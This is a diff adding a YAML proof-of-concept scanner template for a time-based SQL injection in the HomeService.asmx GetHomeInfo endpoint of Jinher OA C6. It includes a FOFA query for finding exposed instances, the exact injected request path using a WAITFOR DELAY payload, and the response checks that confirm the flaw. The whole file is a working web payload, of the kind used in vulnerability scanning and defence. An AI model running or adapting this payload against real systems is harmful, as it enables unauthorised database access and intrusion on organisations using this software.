@@ -1,0 +1,24 @@
+id: poc-yaml-jinher-c6-homeservice-asmx-sqli
+info:
+  name: 金和OA C6 HomeService.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(body,"themes/default/images/m.png") &&
+
+    contains(headers,"text/xml") &&
+
+    duration > t1
+
+    '
+transport: http
